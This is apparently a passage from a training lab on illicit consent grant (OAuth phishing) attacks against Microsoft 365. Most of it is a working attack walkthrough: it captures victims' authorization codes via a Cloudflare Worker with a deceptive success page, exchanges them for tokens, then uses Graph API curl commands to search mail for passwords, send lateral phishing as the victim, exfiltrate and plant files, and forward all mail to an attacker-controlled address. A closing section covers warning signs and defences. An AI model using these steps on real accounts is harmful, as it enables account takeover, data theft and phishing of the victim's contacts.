The victim's browser is now redirected to Microsoft's legitimate login page at `login.microsoftonline.com`. If the victim is already signed into Microsoft 365 in their browser, Microsoft may skip the credential entry and proceed directly to the consent screen. Otherwise, the victim must authenticate with their username, password, and complete any required multi-factor authentication.

After successful authentication, Microsoft displays the consent screen. This screen shows the name of your application (the name you chose during registration), the permissions your application is requesting (the scopes from your authorization URL), and information about who published the application.

The consent screen lists each requested permission in user-friendly language. For example:

- `Mail.Read` is displayed as "Read your email"

- `Mail.Send` is displayed as "Send email on your behalf"

- `Files.ReadWrite.All` is displayed as "Have full access to all files you can access"

- `Notes.Read.All` is displayed as "Read your notebooks"

- `MailboxSettings.ReadWrite` is displayed as "Read and write your mailbox settings"

The user must click "Accept" to grant these permissions. If they click "Cancel", the authorization flow terminates and no code is sent to your redirect URI.

### Capturing the Authorization Code
The moment the victim clicks "Accept", Microsoft generates an authorization code and redirects the victim's browser to your configured redirect URI. The redirect includes the authorization code as a URL parameter:

```
https://relaying-server.redeem-activation.workers.dev/login/authorized?code=1.ARMBLw...&state=12345&session_state=009baba9-3080-996e-eb3c-c5e8483c550f

```
Your Cloudflare Worker receives this request and the code handling logic executes:

```
if (path === '/login/authorized') {
    const code = url.searchParams.get('code');
    console.log('Code:', code);
    return new Response('Hello World!');
}

```
The worker extracts the `code` parameter value and logs it to the console. If you are running `npx wrangler tail` in your terminal, you will immediately see the captured authorization code:

```
Code: 1.ARMBLwi5LQQGjkqy5lf-p_5G6wk9LQNhJaFMkAUGOKUarnU6AboTAQ.AgABBAIAAABlMNzVhAPUTrARzfQjWPtKAwDs_wUA9P-PXqKmHesnqzzP-bFZvHcLAuva86G8-65YdTKUxqVlko4XyPv4gWWq3Y5GuptEZDaPgklv1ty-7jW4nzexWkxM7q8bIN6XQBIxqEHv5zBN5QlH2dqoTm81duUntdTXs28dDrDY5xQpdIdWQVt3WrlHx2zXh0WgbBoJwT4SVjNiyHwVnm1MUmZpd8DEE4vJ_y-4yMnGNA2QTmRJR-h8CMzBqaxZ3eAi2-D7Wwly1bWLRp1nvS5USNapd8WruaR3hEAt8EFv0DYbzzIIiK-rXAzhzDLyNi0XDD6p7wDq9Ch_eflqXERtIbZP5dfPsTGCZRVh2hYYnVyLxrDS68tRrRGsgVaCHtxtfwI-q885WuR6KNuoALgawJZpkYnax-gojNmDWO7UOMZNBe6pD9qBMqBYrkhD6QMriuXslocJDij7MxQkFti9KIe8wypYtTpI5MfrX6H849JUM0UGV8MEyEwVcmau7EK81M3lWqD-G7ycX4JZgEUK3v7bYfKcF6d9hiSWS-BuCFT2GpxHfTxAU2DyTrhMAZrFXNm3XckbMSPyhtzbhVdFIATd6b9WXaca5bllIHifuJ0Ev5jjjZ4G2JYAR1z9FkWllbdgNytyTcT83NhzF_t-SNPApDZrEB-NYoalSUmV1g-wK71Nz2t4loVekGCY66m9IT3TZYNmQalAtkVIWTUWOu5aREDerxtBCu4MT3K4LJGGTEuF-duxBE0FsBlBhc7IlcykTzIXne5bWgjPmagI0euNOEwsnw-ch-Spi6wCRzkiD3Sn91fe_vUN4lcbxjKM5_zl2L1sY5uyZyazgGQ7bneQ9by-69kxHOA08xZdJNFR7r2dVN5lEaIz4q5qvv8gJ_SmFH91xpIrwZDCt5f1UatOcslZOUAb3DQ1Sb0W3VxiC5aOtyKtkZEz3FDdpKdJKaTQKNB1WuGgx0HjxbOb9PMoQtxW9Sbhct6RgdGRNrfLPmIFBexPM1dEMTizk3EcfvVTCuDMvRnK5hMDd5WNrA

```

This authorization code is the critical piece that allows you to obtain access tokens. The code is single-use and expires after approximately 10 minutes, so you must exchange it for tokens quickly.

From the victim's perspective, their browser is redirected to the worker's `/login/authorized` endpoint after granting consent. The worker captures the authorization code and displays a professional success confirmation page through the `getSuccessPage()` function. This page features the Microsoft logo, a green success checkmark icon, and a message confirming that "Your security update has been successfully applied." The victim can then close the window, believing they have completed a legitimate security update.

### Exchanging the Authorization Code for Access Tokens
With the authorization code captured, you must now exchange it for access tokens by making a request to Microsoft's token endpoint. This exchange must be completed before the authorization code expires.

The token exchange requires several parameters including the authorization code, your application's client ID, your application's client secret, the redirect URI, and the grant type. Use the following curl command, replacing the values with your specific details:

```
curl -X POST "https://login.microsoftonline.com/common/oauth2/v2.0/token" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "client_id=YOUR_CLIENT_ID_HERE" \
  -d "client_secret=YOUR_CLIENT_SECRET_HERE" \
  -d "code=1.ARMBLwi...rA" \
  -d "redirect_uri=https://relaying-server.redeem-activation.workers.dev/login/authorized" \
  -d "grant_type=authorization_code" \
  -d "scope=Mail.Read Mail.Send Files.ReadWrite.All Notes.Read.All MailboxSettings.ReadWrite Contacts.Read User.ReadBasic.All openid profile offline_access"

```
The curl command requires several parameters. The `client_id` parameter must be your application's client ID from the application overview page, while `client_secret` is the client secret you generated and saved in Step 2. The `code` parameter contains the authorization code you just captured from the redirect. The `redirect_uri` must exactly match the redirect URI configured in your application. The `grant_type` must be set to `authorization_code` for this OAuth flow, and the `scope` parameter lists the same scopes you requested in the authorization URL, separated by spaces rather than `%20` encoding.

If the request is successful, Microsoft responds with a JSON object containing access tokens and other information:

```
{
  "token_type": "Bearer",
  "scope": "Mail.Read Mail.Send Files.ReadWrite.All Notes.Read.All MailboxSettings.ReadWrite Contacts.Read User.ReadBasic.All openid profile",
  "expires_in": 3599,
  "access_token": "eyJ0eXAiOiJKV1QiLCJub25jZSI6Ik...",
  "refresh_token": "0.ARMBLwi5LQQGjkqy5lf-p_5G6wk9LQ..."
}

```
The response contains several important fields. The `access_token` is a JWT that you can use immediately to make authenticated requests to Microsoft Graph API, though these tokens typically expire after 1 hour (3600 seconds). The `refresh_token` is a long-lived token that allows you to obtain new access tokens without requiring the user to re-authenticate, and these refresh tokens can remain valid for months. The `expires_in` field indicates the number of seconds until the access token expires, while the `scope` field confirms the scopes that were actually granted, which should match what you requested.

Save both the access token and refresh token securely. The access token provides immediate access to the victim's resources, while the refresh token provides long-term persistence.

## Exploiting the Stolen Tokens
With valid access tokens, you now have authorized access to the victim's Microsoft 365 resources within the granted scopes. Microsoft Graph API provides comprehensive programmatic access to emails, files, calendars, and other user data. This section demonstrates common post-exploitation techniques.

### Accessing the Victim's Profile
The first step in any post-exploitation phase is reconnaissance. Use the `/me` endpoint to retrieve detailed information about the compromised user:

```
curl -X GET "https://graph.microsoft.com/v1.0/me" \
  -H "Authorization: Bearer ACCESS_TOKEN" \
  -H "Content-Type: application/json" | jq

```
The `Authorization` header includes your access token as a Bearer token. Microsoft Graph validates the token and returns information about the user who authorized your application. The response includes the user's display name, email address, job title, department, office location, phone numbers, and other profile information.

This information is valuable for understanding the victim's role in the organization and identifying what data they might have access to. For example, if the victim is a senior executive, their email and files are likely to contain sensitive strategic information. If they are in IT or security, they may have access to credentials and infrastructure documentation.

### Reading the Victim's Emails
Email access is one of the most valuable capabilities in a compromise. Emails often contain credentials, sensitive business information, financial data, and communications that can be used for further social engineering. To retrieve the victim's emails:

```
curl -X GET "https://graph.microsoft.com/v1.0/me/messages" \
  -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJub25jZSI6Ik..." \
  -H "Content-Type: application/json" | jq

```
The `/me/messages` endpoint returns an array of email messages from the victim's mailbox. By default, this returns the most recent 10 messages, but you can use query parameters to retrieve more or filter by specific criteria.

Each message object includes metadata like the subject, sender, recipients, date received, and whether the message has attachments. To read the full content of a specific email:

```
curl -X GET "https://graph.microsoft.com/v1.0/me/messages/MESSAGE_ID" \
  -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJub25jZSI6Ik..." \
  -H "Content-Type: application/json" | jq

```
Replace `MESSAGE_ID` with the `id` field from the message list. This returns the complete email including the body content and attachment details.

To search for emails containing specific keywords, use the `$search` query parameter:

```
curl -X GET "https://graph.microsoft.com/v1.0/me/messages?\$search=\"password\"" \
  -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJub25jZSI6Ik..." \
  -H "Content-Type: application/json" | jq

```
This searches all email fields for the specified keyword and returns matching messages. Common search terms for sensitive information include "password", "credential", "confidential", "restricted", "private", and specific project names or technologies.

### Sending Emails as the Victim
If you obtained the `Mail.Send` scope, you can send emails on behalf of the victim. This is particularly useful for lateral phishing attacks, where you send malicious links or attachments to the victim's contacts using their trusted email account. Recipients are far more likely to click links and open attachments from someone they know and trust.

```
curl -X POST "https://graph.microsoft.com/v1.0/me/sendMail" \
  -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJub25jZSI6Ik..." \
  -H "Content-Type: application/json" \
  -d '{
    "message": {
      "subject": "Project Documentation",
      "body": {
        "contentType": "Text",
        "content": "Hi, I have shared the latest project documentation with you. Please review and provide feedback."
      },
      "toRecipients": [
        {
          "emailAddress": {
            "address": "colleague@example.com"
          }
        }
      ]
    }
  }'

```
This sends an email from the victim's account to the specified recipient. You can include multiple recipients, add CC and BCC recipients, and attach files by including attachment objects in the message.

### Accessing OneDrive and SharePoint Files
The `Files.ReadWrite.All` scope provides access to all files the victim can access in OneDrive and SharePoint. This typically includes personal files, shared team files, and organization-wide document libraries. To list files in the victim's OneDrive:

```
curl -X GET "https://graph.microsoft.com/v1.0/me/drive/root/children" \
  -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJub25jZSI6Ik..." \
  -H "Content-Type: application/json" | jq

```
The `/me/drive/root/children` endpoint returns all items in the root directory of the victim's OneDrive. Each item includes metadata like the file name, size, creation date, modification date, and whether it is a file or folder. To download a specific file:

```
curl -X GET "https://graph.microsoft.com/v1.0/me/drive/items/ITEM_ID/content" \
  -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJub25jZSI6Ik..." \
  -o downloaded_file.docx

```
Replace `ITEM_ID` with the `id` field from the file listing. This downloads the file content to your local system. You can use this to exfiltrate sensitive documents, intellectual property, financial data, and other valuable information.

To upload a malicious file to the victim's OneDrive:

```
curl -X PUT "https://graph.microsoft.com/v1.0/me/drive/root:/malicious.docx:/content" \
  -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJub25jZSI6Ik..." \
  -H "Content-Type: application/vnd.openxmlformats-officedocument.wordprocessingml.document" \
  --data-binary "@local_file.docx"

```
This uploads a file from your local system to the victim's OneDrive root directory. Uploaded files can be used for further attacks, such as replacing legitimate documents with malicious versions that contain macros or exploit embedded objects.

### Creating Mailbox Rules for Persistence
The `MailboxSettings.ReadWrite` scope allows you to modify the victim's mailbox configuration, including creating email forwarding rules. This provides a persistence mechanism that continues to provide value even if the victim eventually revokes your application's consent.

A common persistence technique is to create a rule that forwards copies of all future emails to an external address you control:

```
curl -X POST "https://graph.microsoft.com/v1.0/me/mailFolders/inbox/messageRules" \
  -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJub25jZSI6Ik..." \
  -H "Content-Type: application/json" \
  -d '{
    "displayName": "Forward to Archive",
    "sequence": 1,
    "isEnabled": true,
    "conditions": {
      "subjectContains": []
    },
    "actions": {
      "forwardTo": [
        {
          "emailAddress": {
            "address": "attacker-controlled@gmail.com"
          }
        }
      ],
      "stopProcessingRules": false
    }
  }'

```
This creates a mailbox rule named "Forward to Archive" that forwards all incoming emails to the specified external address. The `subjectContains` condition is empty, meaning the rule applies to all emails regardless of subject. The `stopProcessingRules` is set to `false` to ensure other rules continue to execute, making the forwarding less noticeable. More stealthy techniques include only forwarding emails that contain specific keywords:

```
"conditions": {
  "bodyOrSubjectContains": ["password", "confidential", "restricted"]
}

```
This only forwards emails containing sensitive keywords, generating less traffic and reducing the chance of detection.

## Recognizing Consent Screen Warning Signs
When a user is presented with an OAuth consent screen, several indicators can help identify potentially malicious applications. Understanding these warning signs is critical for recognizing illicit consent grant attacks.

### Unverified Publisher Status
Microsoft displays publisher verification badges on consent screens for applications that have completed the verification process. Applications without verification show an "Unverified" label or lack the verified checkmark. While not all unverified applications are malicious, the absence of verification means Microsoft has not validated the identity of the organization or individual who registered the application.

Legitimate enterprise applications from established vendors like Slack, Zoom, or Salesforce display verified publisher badges. An unverified application requesting access to sensitive data like emails or files should raise immediate suspicion.

### Requested Permissions Scope
The consent screen lists all permissions the application is requesting. Applications requesting broad access to multiple resource types may indicate malicious intent. For example, a calendar application requesting `Mail.ReadWrite`, `Files.ReadWrite.All`, and `MailboxSettings.ReadWrite` permissions is requesting far more access than necessary for its stated purpose.

Common suspicious permission combinations include:

- Applications requesting both read and write access to emails when only read access would be necessary

- Calendar or scheduling applications requesting access to files or organizational data

- Applications requesting `MailboxSettings.ReadWrite` which allows creating email forwarding rules

- Applications requesting `User.ReadBasic.All` to enumerate all users in the organization

Users should evaluate whether the requested permissions align with the application's stated functionality.

### Application Name and Description
Attackers often choose application names that mimic legitimate Microsoft services or common enterprise tools. Names like "Office 365 Security Update", "Microsoft Teams Integration", "SharePoint Sync Tool", or "Microsoft Graph Explorer" are designed to appear trustworthy and familiar.

However, legitimate Microsoft services do not request OAuth consent through user-facing authorization flows in this manner. Microsoft's own applications are pre-authorized in tenants or use different authentication mechanisms. An application claiming to be a Microsoft service but requesting OAuth consent is suspicious.

### Redirect URI Domain
While most users will not examine the technical details of the OAuth flow, security-conscious users can inspect the authorization URL before clicking "Accept" to identify the redirect URI parameter. The redirect URI indicates where Microsoft will send the authorization code after consent is granted.

Legitimate applications use redirect URIs on domains they control. For example, Slack uses redirect URIs like `https://slack.com/oauth/authorize`. If the redirect URI points to an unfamiliar domain, a newly registered domain, or infrastructure like Cloudflare Workers or Heroku, this may indicate a malicious application. Common suspicious redirect URI patterns include:

- Generic cloud hosting domains like `*.workers.dev`, `*.herokuapp.com`, `*.azurewebsites.net`

- Newly registered domains that imitate Microsoft or enterprise services

- Domains with typosquatting or character substitution

- IP addresses instead of domain names

## Resources

### Attack Methodology and Techniques

- Introduction to 365-Stealer - Understanding and Executing the Illicit Consent Grant Attack

- Consent Phishing - Microsoft Security Blog

### Microsoft Graph API and Permissions

- Microsoft Graph API Documentation

- Microsoft Graph Permissions Reference

- Delegated vs Application Permissions

- Microsoft Graph Explorer - Interactive tool for testing Graph API requests

### OAuth 2.0 Protocol

- OAuth 2.0 Authorization Framework (RFC 6749)

- Microsoft Entra ID OAuth 2.0 Documentation

- OAuth 2.0 Threat Model and Security Considerations

- OAuth 2.0 Security Best Current Practice

### Detection, Defense, and Incident Response

- Detecting and Remediating Illicit Consent Grants

- Investigate and Remediate Risky OAuth Apps

- Azure AD Application Consent Policies

- MITRE ATT&CK - Valid Accounts: Cloud Accounts (T1078.004)

### Cloudflare Workers

- Cloudflare Workers Documentation

- Wrangler CLI Documentation

- Workers Custom Domains

### Post-Exploitation Tools

- ROADtools - Azure AD exploration and attack framework

- AADInternals - PowerShell module for Azure AD reconnaissance

- TokenTactics - OAuth token exploitation toolkit

- GraphRunner - Post-exploitation toolset for Microsoft Graph

- Microsoft Graph X-Ray - Visual tool for exploring Graph API permissions

## Objectives
Perform an illicit consent grant attack to capture an access token

Explore different post-exploitation tools that can be used to assist with an illicit consent grant attack


---

